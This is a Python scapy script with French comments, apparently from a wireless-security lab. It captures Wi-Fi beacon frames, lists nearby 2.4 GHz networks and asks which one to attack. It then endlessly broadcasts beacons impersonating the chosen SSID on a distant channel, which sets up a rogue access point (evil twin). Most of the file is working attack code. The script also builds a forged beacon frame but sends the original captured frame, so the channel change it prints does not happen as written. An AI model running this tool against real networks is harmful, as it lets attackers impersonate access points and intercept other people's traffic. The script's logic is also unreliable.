#!/bin/python

from scapy.all import *
import numpy as np

def main():
    print("Récupération des trames Beacon...", end=' ', flush=True)
    # On écoute pendant 30s les trames de type beacon
    frame_arr = sniff(iface="wlan0", filter="type mgt subtype beacon", timeout=30)
    print("[OK]", flush=True)

    # On récupère tous les SSIDs (uniques)
    ssid_dict = {}
    for frame in frame_arr:
        ssid_name = frame.getlayer(Dot11Beacon).info.decode()
        # On ne souhaite pas record les SSIDs masqués
        if ssid_name.rstrip('\x00') == '':
            continue
        
        channel_freq = frame.getlayer(RadioTap).ChannelFrequency
        signal_strength = frame.dBm_AntSignal
        
        if ssid_name not in ssid_dict.keys():
            ssid_dict[ssid_name] = [], []
        
        ssid_dict[ssid_name][0].append(channel_freq)
        ssid_dict[ssid_name][1].append(signal_strength)

    menu_dict = {}
    for ssid in ssid_dict.keys():
        channels = []
        for c in np.unique(ssid_dict[ssid][0]):
            # Pour les canaux 5GHz
            #if c // 5000 == 1:
            #    f = (c - 5000) // 5
            
            if c // 2000 == 1:
                f = (c - 2400) // 5 - 1
                channels.append(f)
        # Si aucun canal 2Ghz n'existe pour ce réseau
        if len(channels) == 0:
            continue
        
        signal = round(np.average(ssid_dict[ssid][1]))
        menu_dict[ssid] = channels, signal


    if len(list(menu_dict.keys())) == 0:
        print("Aucune trame Beacon sur une fréquence de 2.4GHz n'a été reçue.")
        return


    # Affichage du menu
    print(f"ID  {'SSID'.ljust(32)} {'Canaux'.ljust(54)} {'dBm'.ljust(10)}")
    for i, ssid in enumerate(menu_dict.keys()):
        channels = str(list(menu_dict[ssid][0]))
        signal = str(menu_dict[ssid][1])
        print(f"{str(i).rjust(2)}: {ssid.ljust(32)} {channels.ljust(54)} {signal.ljust(10)}")

    choice = -1
    while choice < 0 or choice >= len(menu_dict.keys()):
        choice = input("Réseau à attaquer: ")
        try:
            choice = int(choice)
        except:
            continue

    ssid = list(menu_dict.keys())[choice]

    # Recherche d'une des frames originales
    frame = RadioTap()
    for f in frame_arr:
        ssid_name = f.getlayer(Dot11Beacon).info.decode()
        if ssid_name == ssid:
            frame = f
            break

    # Channel original
    channel = frame[Dot11Elt][2].info[0]
    # On veux "6 canaux de séparation"
    if channel > 7:
        channel -= 7
    else:
        channel += 7
    
    print(f"Transmission des frames Beacon avec le SSID '{ssid}' sur le canal {channel}")
        
    # Adresse MAC de "l'AP"
    ap_mac = "12:34:56:78:9a:bc"
    # Création de la trame Beacon à partir de 0
    beacon = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac,
        addr3=ap_mac)/Dot11Beacon(cap="ESS")/Dot11Elt(ID="SSID", info=ssid)/Dot11Elt(ID="Rates",
        info="\x82\x84\x0b\x16")/Dot11Elt(ID="DSset", info=chr(channel))
    sendp(frame, iface="wlan0", inter=0.1, loop=1)
    
    # Créer un faux channel en reprenant la trame Beacon et en changeant le channel, marche aussi
    #frame[Dot11Elt][2].info = bytes([channel])
    #sendp(frame, iface="wlan0", inter=0.1, loop=1)


if __name__ == "__main__":
    main()
